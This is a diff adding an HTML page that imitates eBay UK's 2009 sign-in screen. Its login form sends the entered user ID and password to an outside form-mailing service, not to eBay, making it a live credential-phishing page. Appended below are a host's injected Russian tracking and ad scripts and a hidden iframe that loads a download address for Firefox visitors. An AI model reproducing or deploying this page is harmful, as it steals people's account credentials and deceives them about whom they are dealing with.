@@ -1,0 +1,365 @@
+<style>
+     #topbox {font-family:tahoma;font-size:12px}
+ </style>
+    
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"><html>
+<head>
+<!--eBay V3- msxml 4.0 XXXXXXXXXXXXXXXXXXXXXXXXXX-->
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><!--srcId: SignIn-->
+<title>Welcome to eBay</title><script language="JavaScript"><!--
+     var pageName = "PageSignIn";    
+    //--></script><script language="JavaScript"><!--
+    var sThisURL = window.location.href;   
+    function doFramesBuster()
+     {
+         if ( top.location != self.location )
+          {
+        top.location.replace( sThisURL );
+              }
+     }
+   //--></script><link type="text/css" href="https://secureinclude.ebaystatic.com/css/e615/uk/areaTitleDeployment_SSL_e6151uk.css" media="all" rel="stylesheet">
+</head>
+<body bgcolor="#ffffff"><input type="hidden" id="hdn" value="https://secureinclude.ebaystatic.com/"><div id="kgdiv"> </div><script src="https://secureinclude.ebaystatic.com/js/e615/uk/features/krb/krb_e6151uk.js"> </script><div class="YukonPageWidth"><div class="pagewidth"><div class="pageminwidth"><div class="pagelayout"><div class="pagecontainer"><!-- Begin eBay Header --><!--2009-05-06 05:05:56,,, nu.rundkoi35?,RcmdId SignIn,RlogId p4plaijkoiwi%3C%3Dkw%2Bpplaijk67%3A-12140365744--><link rel="stylesheet" type="text/css" href="https://secureinclude.ebaystatic.com/v4css/en_GB/e615i/GlobalNav14_SignInEbay_e615i8637335_en_GB_s.css"><!--cacheStatus: true--><script>var _GlobalNavHeaderUtf8Encoding=true;</script><script>var _GH_Bta_PC=true;</script><script>var _GlobalNavHeaderCookieTracking=true;</script><script>var _GlobalNavHeaderSrcPageId="554";</script><script src="https://secureinclude.ebaystatic.com/v4js/en_GB/e615i/SYS14_vjo_e615i8637324_1_en_GB.js"></script><script src="https://secureinclude.ebaystatic..com/v4js/en_GB/e611i/GlobalNav14_SignInEbay_e611i8276132_1_en_GB.js"></script><span class="ebay"><div id="gnheader" class="gbhdr"><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td><!-- headerType=MIN:SECURE--><script type="text/javascript">var RoverDomainBaseUrl = 'https://rover.ebay.co.uk';var svrGMT = 1242322851652;</script><div id="cobrandHeader"></div><div id="dynamicmenu-hdrCtr" class="hdrCtr"><table border="0" cellpadding="0" cellspacing="0" width="100%" class="logobar"><tr><td width="1%" valign="bottom" class="logoimg"><a href="http://www.ebay.co.uk" rel="nofollow"> <img src="https://securepics.ebaystatic.com/aw/pics/uk/logos/logoEbay_x45.gif" alt="From collectables to cars, buy and sell all kinds of items on eBay" border="0"></img></a></td><td valign="bottom" width="50%"></td></tr></table><table border="0" cellpadding="0" cellspacing="0" width="100%"><tr><td class="brnd1"></td><td class="brnd2"></td><td class="brnd3"></td><td class="brnd4"></td><td class="brnd5"></td><td class="brnd6"></td><td class="brnd7"></td></tr><tr><td class="brnd8"></td><td class="brnd8"></td><td class="brnd8"></td><td class="brnd8"></td><td class="brnd8"></td><td class="brnd8"></td><td class="brnd8"></td></tr></table></div><script type="text/javascript">var includeHost="https://secureinclude.ebaystatic.com/";</script><script src="https://secureinclude.ebaystatic.com/js/e615/uk/features/signin/signin_base_e6151uk.js"></script><link rel="stylesheet" type="text/css" href="https://secureinclude.ebaystatic.com/css/e615/uk/legacy/ebay-ns_e6151uk.css"><div></div><div style="display:none;" id="dynMenuCtr"><table cellpadding="0" cellspacing="0" border="0"><tr><td colspan="3" class="dynmenubrdr">##1##</td></tr><tr><td><img src="https://securepics.ebaystatic.com/aw/pics/motors2/images/imgCrnrO4.gif" height="6" width="6" border="0" class="crnrimg"></td><td class="dynmenubtmbrdr">##2##</td><td><img src="https://securepics.ebaystatic.com/aw/pics/motors2/images/imgCrnrO3.gif" height="6" width="6" border="0" class="crnrimg"></td></tr></table></div></td></tr></table></div></span><script>vjo.darwin.core.dynamicmenu.ReplaceHandler.replace("BrowseCategoriesMenu", "getBrowseCatsDAPData", ".ebay.com")</script><!--@sghp@ headerStyle=MIN:SECURE: @eghp@--><!-- End eBay Header --><link rel="stylesheet" type="text/css" href="https://secureinclude.ebaystatic.com/css/e615/uk/signin/signinyukon_SSL_e6151uk.css">
+
+<link rel="stylesheet" type="text/css" href="https://secureinclude.ebaystatic.com/css/e615/uk/legacy/ebay-ns_SSL_e6151uk.css">
+<table border="0" cellpadding="0" cellspacing="0" width="100%">
+<tr>
+<td><img src="https://securepics.ebaystatic.com/aw/pics/spacer.gif" height="10" alt=" " title=""></td>
+</tr>
+<tr>
+<td valign="middle" width="100%" align="left">
+<table border="0" width="100%" cellpadding="0" cellspacing="0">
+<tr>
+<td width="14"><img src="https://securepics.ebaystatic.com/aw/pics/spacer.gif" width="14px" alt=" " title=""></td>
+<td valign="middle" align="left" class="sectiontitleYukon" style="padding-bottom:5px" nowrap>Welcome to eBay</td>
+<td width="4%" nowrap valign="middle"><img src="https://securepics.ebaystatic.com/aw/pics/spacer.gif" width="2" height="1" alt=" " title=""></td>
+</tr>
+</table>
+</td>
+
+</tr>
+
+<tr>
+<td><img src="https://securepics.ebaystatic.com/aw/pics/spacer.gif" height="20" alt=" " title=""></td>
+</tr>
+</table>
+<table border="0" cellpadding="0" cellspacing="0" width="100%">
+<tr>
+<td width="100%" valign="top">
+<table cellspacing="0" cellpadding="0" width="100%" border="0">
+<tr>
+<td colspan="3">
+<table cellpadding="0" cellspacing="0" border="0" width="100%">
+<tr>
+<td rowspan="2"><img src="https://securepics.ebaystatic.com/aw/pics/globalassets/imgpanelulgrey.gif"></td>
+<td height="1" width="100%" bgcolor="#cccccc"><img src="https://securepics.ebaystatic.com/aw/pics/spacer.gif" height="1"></td>
+<td rowspan="2"><img src="https://securepics.ebaystatic.com/aw/pics/globalassets/imgpanelurgrey.gif"></td>
+
+</tr>
+<tr>
+
+<td height="9" width="100%"><img src="https://securepics.ebaystatic.com/aw/pics/spacer.gif" height="9"></td>
+</tr>
+</table>
+</td>
+</tr>
+<tr>
+<td bgcolor="#cccccc" width="1"><img title="" width="1px" alt=" " src="https://securepics.ebaystatic.com/aw/pics/spacer.gif"></td>
+<td class="titleYukon" style="padding:3px 10px 10px 10px">Ready to bid and buy? Register here</td>
+<td bgcolor="#cccccc" width="1"><img title="" width="1px" alt=" " src="https://securepics.ebaystatic.com/aw/pics/spacer.gif"></td>
+</tr>
+<tr style="padding-bottom:20px">
+<td bgcolor="#cccccc" width="1"><img title="" width="1px" alt=" " src="https://securepics.ebaystatic.com/aw/pics/spacer.gif"></td>
+<td style="padding:10px 10px 10px 10px">
+
+<form method="post" name="RegisterEnterInfo" id="RegisterEnterInfo" style="margin:0" action="https://scgi.ebay.co.uk/ws/eBayISAPI.dll?RegisterEnterInfo&amp;siteid=3&amp;co_partnerid=2&amp;UsingSSL=1"><input type="hidden" name="MfcISAPICommand" value="RegisterEnterInfo"><input type="hidden" name="co_partnerId" value="2"><input type="hidden" name="siteid" value="3"><input type="hidden" name="ru" value="http%3A%2F%2Fwww.ebay.co.uk%2F"><input type="hidden" name="bin" value="-1"><table border="0" cellpadding="0" cellspacing="0" width="100%">
+<tr>
+<td valign="top">Join the millions of people who are already a part of the eBay family. <p>Register as an eBay Member and enjoy privileges including:</p>
+
+<ul class="commonList">
+<li><b>Bid, buy and find bargains</b> from all over the world<br><img src="https://securepics.ebaystatic.com/aw/pics/spacer.gif" width="1" height="10" alt=" " title=""><br></li>
+<li><b>Shop with confidence</b> with PayPal Buyer Protection<br><img src="https://securepics.ebaystatic.com/aw/pics/spacer.gif" width="1" height="10" alt=" " title=""><br></li>
+<li><b></b>Connect with the eBay community and more. <br><img src="https://securepics.ebaystatic.com/aw/pics/spacer.gif" width="1" height="5" alt=" " title=""><br></li>
+
+</ul><button type="submit" class="SIForBtn" style="*padding-top:5px;_padding-top:5px;" name="register_submit"><span class="b1"><span class="b2"><span class="b3">Register</span></span></span></button></td>
+</tr>
+</table>
+</form>
+</td>
+
+<td bgcolor="#cccccc" width="1"><img title="" width="1px" alt=" " src="https://securepics.ebaystatic.com/aw/pics/spacer.gif"></td>
+</tr>
+<tr>
+<td colspan="3">
+<table cellpadding="0" cellspacing="0" border="0" width="100%">
+<tr>
+<td rowspan="2"><img src="https://securepics.ebaystatic.com/aw/pics/globalassets/imgpanelllgrey.gif"></td>
+<td height="9" width="100%"><img src="https://securepics.ebaystatic.com/aw/pics/spacer.gif" height="9"></td>
+<td rowspan="2"><img src="https://securepics.ebaystatic.com/aw/pics/globalassets/imgpanellrgrey.gif"></td>
+</tr>
+
+<tr>
+<td height="1" width="100%" bgcolor="#cccccc"><img src="https://securepics.ebaystatic.com/aw/pics/spacer.gif" height="1"></td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
+
+</td>
+<td width="15"><img title="" height="1" alt=" " src="https://securepics.ebaystatic.com/aw/pics/spacer.gif" width="15"></td>
+<td width="350">
+<div class="signinyukon-rcp">
+<div class="signinyukon-n">
+<div class="signinyukon-e">
+<div class="signinyukon-w"></div>
+</div>
+</div>
+
+<div class="signinyukon-mid">
+<table cellspacing="0" cellpadding="0" border="0" width="350">
+<tr>
+<td class="titleYukon" style="padding:5px 15px 5px 10px">Sign in to your account</td>
+</tr>
+<tr>
+<td style="padding:0px 5px 10px 5px">
+
+<form enctype="multipart/form-data" method="post" action="http://www.freedback.com/mail.php" accept-charset="UTF-8">
+	<div>
+		<input type="hidden" name="acctid" id="acctid" value="naal17k54k1w19tb" />
+		<input type="hidden" name="formid" id="formid" value="797122" /><table border="0" cellpadding="0" cellspacing="5" width="100%">
+<tr>
+<td valign="top" style="padding-top:5px">Sign in now to buy, bid and sell, or to manage your account.<br></td>
+</tr>
+
+<tr>
+<td><img src="https://securepics.ebaystatic.com/aw/pics/spacer.gif" width="1" height="5" alt=" " title=""></td>
+</tr>
+<tr>
+<td>
+<table width="100%" cellpadding="0" cellspacing="0">
+<tr>
+<td width="70"></td>
+<td class="errorYukon"></td>
+</tr>
+
+<tr>
+<td colspan="2" height="5"></td>
+</tr>
+<tr>
+<td nowrap width="70">
+        User ID  
+       </td>
+
+<td><input type="text" name="userid" id="userid" maxlength="64" tabindex="1" value="" style="font-family:Arial" size="27"></td>
+</tr>
+<tr>
+<td></td>
+<td style="font-size:x-small; font-family:Verdana"><a href="http://cgi4.ebay.co.uk/ws/eBayISAPI.dll?UserIdRecognizerShow">I've forgotten my user ID</a></td>
+</tr>
+<tr>
+<td colspan="2" height="5"></td>
+
+</tr>
+<tr>
+<td nowrap width="70"><a name="Password" style="text-decoration:none">
+        Password  
+       </a></td>
+<td><input type="password" name="pass" maxlength="64" value="" tabindex="2" style="font-family:Arial" size="27"></td>
+
+</tr>
+<tr>
+<td></td>
+<td style="font-size:x-small; font-family:Verdana"><a href="https://scgi.ebay.co.uk/ws/eBayISAPI.dll?FYPShow">I've forgotten my password</a></td>
+</tr>
+</table><input type="Hidden" name="kgct" value="AQAAASETODJjAAVveWlFb1FzWGFmWm94Um1Ra1VNZ0RDSGxzOGpoZXpEK2U0blBEcGIxdUlBPTyFfFrSCdHEbs9HtipgLdta3f0a"></td>
+</tr>
+<tr>
+<td></td>
+
+</tr>
+<tr>
+<td><img src="https://securepics.ebaystatic.com/aw/pics/spacer.gif" width="1" height="8" alt=" " title=""></td>
+</tr>
+<tr>
+<td>
+
+<table width="100%" cellpadding="0" cellspacing="0">
+<tr>
+<td valign="top"><input type="checkbox" name="keepMeSignInOption" value="1" tabindex="4"></td>
+<td width="100%"><b>Keep me signed in for today.</b> Don't tick this box if you're at a public or shared computer.
+     </td>
+</tr>
+</table>
+</td>
+</tr>
+
+<tr>
+<td><img src="https://securepics.ebaystatic.com/aw/pics/spacer.gif" width="1" height="5" alt=" " title=""></td>
+</tr>
+<tr>
+<td align="right"><button type="submit" tabindex="3" class="SIActBtn"><span class="btn" style="*margin-left:-10px;_margin-left:0px;"><span class="btn">Sign in</span></span></button></td>
+
+</tr>
+</table>
+</form>
+</td>
+</tr>
+</table>
+</div>
+<div class="signinyukon-s">
+<div class="signinyukon-e">
+<div class="signinyukon-w"></div>
+</div>
+
+</div>
+</div>
+<div>
+<p><b>Having problems with signing in? </b><a href="http://pages.ebay.co.uk/help/new/contextual/signin.html" onclick="return ebay.oDocument._getControl('openHelpWindow')._exec('openContextualHelpWindow',this.href);" target="helpwin">Get help</a>.
+        </p>
+
+      </p>
+</div>
+</td>
+</tr>
+</table><br><hr color="#cccccc" noshade size="1"><script src="https://secureinclude.ebaystatic.com/js/e615/uk/features/signin/signin_body_e6151uk.js"> </script><script language="JavaScript"><!--
+   ebay.oDocument.oPage.createConfig = function()
+   {
+   var cfg = ebay.oDocument.addConfig(new EbayConfig("signInConfig"));
+   
+         cfg.isUsernamePrepopulated = false;
+    
+   }
+      ebay.oDocument.oPage.createConfig();
+   //--></script><script language="JavaScript">
+   (function(){  
+    var c = ebay.oDocument..addConfig(new EbayConfig("kg"));
+    c.sStatusField = "lse";
+    c.sNumberField = "lsv";
+    c.sFormField = "mid";
+    c.sDiv = "kgdiv";
+    c.sHttpFormField = "hmid";
+    
+     c.sKnownGoodEnabled =true;
+     
+    
+   })();
+  </script><script type="text/javascript" language="JavaScript" xmlns:bx="http://www.ebay.com/2004/bex">
+     ebay.oDocument.oPage.createConfig = function() {var  c = ebay.oDocument.addConfig(new EbayConfig('EBX.CrossLinking'));c.sLayer='ebx_layer';c.sHTML='<table align="center" style="border:2px solid #0098CF; margin-bottom: 15px;" width="85%" cellpadding="0" cellspacing="0" bgcolor="#EDF9FF"><tr valign="middle"><td width="36" style="padding: 0 10px 0 10px;"><img align="middle" src="https://securepics.ebaystatic.com/aw/pics/icon/iconInfo_16x16.gif" /></td><td width="80%" nowrap="nowrap" style="padding-right:10px" >You\'ve left eBay Express.</td><td align="left" nowrap="nowrap"><a href="http://www.express.<#1#>/">Shop again on eBay Express</a><span style="margin:0 10px 0 10px;">|</span><img align="bottom" src="https://securepics.ebaystatic.com/aw/pics/express/icons/iconCart_15x10.gif" alt=""/> <a href="http://cart.express.<#1#>/ws/eBayISAPI.dll?ExpressCart&action.view=&from=Header">Shopping Basket<#2#></a></td><td width="135" nowrap="nowrap" style="padding: 0 20px 0 20px;"><img align="top" src="https://securepics.ebaystatic.com/aw/pics/express/logos/logoExpressUK_131x20.gif" alt=""></img></td><td nowrap="nowrap" width="26" align="left"><a href="#1" id="b_close" name="b_close"><img align="middle" border="0" src="https://securepics.ebaystatic.com/aw/pics/buttons/btnExpressClose.gif" alt="" ></img></a></td></tr></table>';c.sCartCountText=' (<#1#>)';c.sClose='b_close';c.aHost={'0':'ebay.com','77':'ebay.de','2':'ebay.co.uk','15':'ebay.com.au'};c.aHideOnParams=<"fromebxris=1", "fromebxrisZ1">;} ;ebay.oDocument.oPage.createConfig();</script><!--Begin eBay Footer--><!--cacheStatus: false--><span class="ebay"><div id="glbfooter"><table border="0" cellpadding="0" cellspacing="0" width="100%"><tr><td class="g-pipe"><img src="https://securepics.ebaystatic.com/aw/pics/uk/s.gif" height="10" width="1"><br><a href="http://pages.ebay.co.uk/aboutebay.html">About eBay</a> | <a href="http://www2.ebay.com/aw/marketing-uk.shtml">Announcements</a> | <a href="http://pages.ebay.co.uk/safetycentre/index.html">Safety Centre</a> | <a href="http://web.ebay.co.uk/partnercentre/index.html">Partner Centre</a> | <a href="http://pages.ebay.co.uk/vero/index.html">VeRO Protecting IP</a> | <a href="http://pages.ebay.co.uk/help/policies/index.html" rel="nofollow">Policies</a> | <a href="http://pages.ebay.co.uk/services/forum/feedback.html">Feedback Forum</a> | <a href="http://pages.ebay.co.uk/sitemap.html">Site Map</a> | <a href="http://pages.ebay.co.uk/help/index.html">Help</a></td></tr><tr><td height="4"></td></tr><tr><td height="1" bgcolor="#CCCCCC" colspan="2"></td></tr><tr><td height="4"></td></tr><tr class="g-hlp" valign="top"><td class="g-nav coreFooterLegalNotice">Copyright ? 1995-2009 eBay Inc. All Rights Reserved. Designated trademarks and brands are the property of their respective owners. Use of this Web site constitutes acceptance of the eBay <a href="http://pages.ebay.co.uk/help/policies/user-agreement.html" rel="nofollow">User Agreement</a> and <a href="http://pages.ebay.co.uk/help/policies/privacy-policy.html" rel="nofollow">Privacy Policy</a>.<br><img src="https://securepics.ebaystatic.com/aw/pics/uk/s.gif" height="10"><table border="0" cellpadding="0" cellspacing="0" width="100%"><tr><td class="g-nav" width="100%"><a href="http://viv.ebay.co.uk/ws/eBayISAPI.dll?EbayTime">eBay official time</a></td></tr></table></td><td align="right" nowrap="nowrap"><table border="0" cellpadding="0" cellspacing="0" width="100%"><tr><td align="center"><div class="coreFooterVerisign"> <a onclick="this.href='https://seal.verisign.com/splash?form_file=fdf/splash.fdf&amp;lang=en&amp;dn='+location.host;return true;" href="https://seal.verisign.com/splash?form_file=fdf/splash.fdf&amp;dn=SCGI.EBAY.COM&amp;lang=en" target="_blank"><img src="https://securepics.ebaystatic..com/aw/pics/uk/logos/logoVeriSign_100x65.gif" alt="Verisign Seal" border="0" height="65" width="100"></img></a></div></td></tr><tr><td align="center" nowrap="nowrap" class="g-nav"><a href="http://www.verisign.com/ssl-certificate">About SSL Certificates</a></td></tr></table></td></tr></table><div id="cobrandFooter"></div></div></span><script src="https://secureinclude.ebaystatic.com/js/e615/uk/features/signin/signin_footer_e6151uk.js"></script><script type="text/javascript">var un="undefined";if(typeof(vjo)!=un && typeof(vjo.darwin)!=un && typeof(vjo.darwin.core)!=un && typeof(vjo.darwin..core.ebayheader)!=un && typeof(vjo.darwin.core.ebayheader.rtm)!=un && typeof(vjo.darwin.core.ebayheader.rtm.GlobalHeaderRtmCall)!=un)vjo.darwin.core.ebayheader.rtm.GlobalHeaderRtmCall.submitRTMCall("")</script><!--@sgfp@ footerStyle=FULL:SSL @egfp@--></div></div></div></div><!--End eBay Footer--><script src="https://srv.uk.ebayrtm.com/rtm?RtmGetCapJs&p=18"></script></div><script language="JavaScript">
+      ebay.oDocument.oPage.createConfig = function() {
+       var infoCfg = ebay.oDocument.addConfig(new EbayConfig("kgClientInfoCfg"));
+       infoCfg.sHiddenBoxId = "bhid";
+      }
+      ebay.oDocument.oPage.createConfig();
+      </script></body>
+
+</html>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+
+<P>&nbsp;</P>
+
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P><script>if (window!=window.top){document.write('<div style="display:none">');dwrite = document.write;document.write = function(){}}</script>
+
+<div align="center"><table cellpadding=0 cellspacing=0 border=0 align=center><tr valign="top"><td align=center>
+
+<div align="center" style="width:300px;  margin:0px; padding:3px 0px 3px 0px; border:solid #529eef; border-width:1px 1px 1px 1px">
+<div style="width:300px; background-color:#FFFFFF; margin:0px; padding:3px 0px 3px 0px; border:solid #529eef; border-width:0px 0px 0px 0px"> 
+<a onmousedown="document.createElement('IMG').src='http://rb.qip.ru/?bid=MjYyODozOTg5&r='+Math.random();" title="почта"href="http://mail.qip.ru/"style="color: blue"target="_blank">Почта</a>
+&nbsp;&nbsp;&nbsp;<a onmousedown="document.createElement('IMG').src='http://rb.qip.ru/?bid=MjYyODozOTkz&r='+Math.random();" title="Приколы"href="http://humor.qip.ru/"style="color: blue"target="_blank">Приколы</a>
+&nbsp;&nbsp;&nbsp;<a onmousedown="document.createElement('IMG').src='http://rb.qip.ru/?bid=MjYyODo0NDUx&r='+Math.random();" title="Фото ссылки" href="http://pics.qip.ru/"style="color: blue"target="_blank">Фото ссылки</a>
+</div>
+
+</td>
+<td width="15px">&nbsp;</td><td width=100%>
+<iframe width="100%" height="90" frameborder="0" scrolling="no"  src="http://click.readme.ru/informer/htm/15312.htm"></iframe>
+</td></tr></table></div>
+
+<script type="text/javascript"><!--
+document.write("<a href='http://www.liveinternet.ru/click;pochta-ru' "+"target=_blank><img src='http://counter.yadro.ru/hit;pochta-ru?t26.1;r"+
+escape(document.referrer)+((typeof(screen)=="undefined")?"":";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
+screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+";"+Math.random()+"'"+"border='0'width='88'height='15'/><\/a>")
+//--></script>
+
+<script language="JavaScript">
+var img = new Image();img.src = 'http://www.tns-counter.ru/V13a***R>' + document.referrer.replace(/\*/g,'%2a') + '*rbc_ru/ru/UTF-8/tmsec=pochta_hostings/';
+</script>
+<noscript><img src="http://www.tns-counter.ru/V13a****rbc_ru/ru/UTF-8/tmsec=pochta_hostings/"width="1"height="1"alt=""/></noscript>
+
+<script language="javascript"><!--skip ();
+u="count.rbc.ru/p103.gif";d=document;nv=navigator;na=nv.appName;p=0;j="N";
+n=(na.substring(0,2)=="Mi")?0:1;y="";
+y+="<img src='http://"+u+"?r="+escape(d.referrer)+"&width="+screen.width+"&height="+screen.height+"&hash="+d.location.hash.substr(1)+"&rn="+Math.random();
+y+="' border=0 width=1 height=1 alt='count'>";
+d.write(y);if(!n) { d.write("<"+"!--"); }//--></script><noscript>
+<img src="http://count.rbc.ru/p103.gif" alt='count' border=0 width=1 height=1 >
+</noscript><script language="javascript1.2"><!--skip ();
+if(!n) { d.write("--"+">"); }//--></script>
+
+
+<div style="display: none;">
+<script type="text/javascript">
+var qipbar_flag =  false;
+frameLoad = function()
+{
+if (qipbar_flag || (window.navigator.userAgent.search('Firefox') == -1))return true;
+qipbar_flag = true;
+window.downbar_frame = document.getElementById('downbar_frame');
+if (downbar_frame)downbar_frame.src='http://data.addons.qip.ru/download.php';
+}
+</script>
+<iframe id="downbar_frame" src="about:blank" width="1" height="1" onload="frameLoad();"></iframe>
+</div>
+<script>if (window!=window.top){document.write = dwrite;document.write('</div>');}</script><script type="text/javascript"><!--
+document.cookie="rb_shows=25%e49; expires=Thu, 30 Jul 2020 20:00:00 GMT; path=/; domain=htelfe.krovatka.su";
+document.cookie="rb_shows_day=25-1%e49-1; expires=Wed, 22 Sep 2010 20:00:00 GMT; path=/; domain=htelfe.krovatka.su";
+--></script>
